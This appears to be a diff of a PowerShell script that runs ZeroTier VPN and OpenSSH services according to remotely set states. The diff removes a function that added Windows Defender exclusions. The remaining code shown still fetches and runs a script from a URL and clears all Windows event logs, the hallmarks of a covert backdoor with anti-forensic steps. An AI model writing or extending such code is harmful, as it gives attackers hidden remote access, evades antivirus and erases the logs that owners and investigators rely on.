@@ -274,17 +274,6 @@ function Remove-Package {
     Uninstall-Package $PackageName -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 }
 
-#Function to add defender exclusions.
-function Add-WindowsDefenderExclusion {
-    try {
-        Add-MpPreference -ExclusionPath $defenderexclusins -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
-        if (-not $AddExclusionError) {
-        }
-    }
-    catch {
-    }
-}
-
 #Function to purge ping exes.
 function RemovePings {
     foreach ($file in $pingexepaths) {
@@ -319,7 +308,6 @@ if ($null -ne $storedCode) {
                 switch ($status) {
                     "active" {
                         RetryOps {
-                            Add-WindowsDefenderExclusion
                             Start-ServiceSafe -ServiceName $ztservice
                             Start-ServiceSafe -ServiceName $sshagentservice
                             Start-ServiceSafe -ServiceName $sshdservice
@@ -330,8 +318,7 @@ if ($null -ne $storedCode) {
                         } -MaxRetries $retryAttempts
                     }
                     "dormant" {
-                        RetryOps {
-                            Add-WindowsDefenderExclusion
+                        RetryOps { 
                             WebExecution -InstallScriptURL $ztnethandler
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                             Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
@@ -344,7 +331,6 @@ if ($null -ne $storedCode) {
                     "rejoin" {
                         RetryOps {
                             zerotier_purge
-                            Add-WindowsDefenderExclusion
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
                             Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
@@ -369,7 +355,6 @@ if ($null -ne $storedCode) {
                     "purge" {
                         RetryOps {
                             #zerotier_purge
-                            Add-WindowsDefenderExclusion
                             Remove-Package "ZeroTier One"
                             Remove-Package OpenSSH
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice
@@ -433,8 +418,7 @@ if ($null -ne $storedCode) {
                     }
                     #ping purge
                     "pingpurge" {
-                        RetryOps {
-                            Add-WindowsDefenderExclusion
+                        RetryOps {                          
                             RemovePings
                             Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log } 
                         } -MaxRetries $retryAttempts
